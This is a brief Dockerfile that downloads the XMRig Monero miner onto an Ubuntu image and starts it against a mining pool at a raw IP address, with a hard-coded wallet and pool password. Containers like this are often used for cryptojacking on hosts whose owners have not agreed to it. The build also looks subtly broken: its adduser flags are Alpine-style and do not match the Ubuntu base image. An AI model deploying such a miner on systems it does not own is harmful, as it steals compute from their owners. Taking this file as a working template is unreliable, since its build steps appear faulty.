FROM  ubuntu
RUN adduser -S -D -H -h /xmrig-2.6.2 xminer
RUN apt-get update && apt-get install -y wget
RUN wget https://github.com/xmrig/xmrig/releases/download/v2.6.2/xmrig-2.6.2-xenial-amd64.tar.gz
RUN tar -xvzf xmrig-2.6.2-xenial-amd64.tar.gz
USER xminer
WORKDIR xmrig-2.6.2/
CMD ./xmrig -o 85.255.7.60:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p hunter2 -k --av=2 --nicehash  --cpu-priority 1 --donate-level=1 -t 1
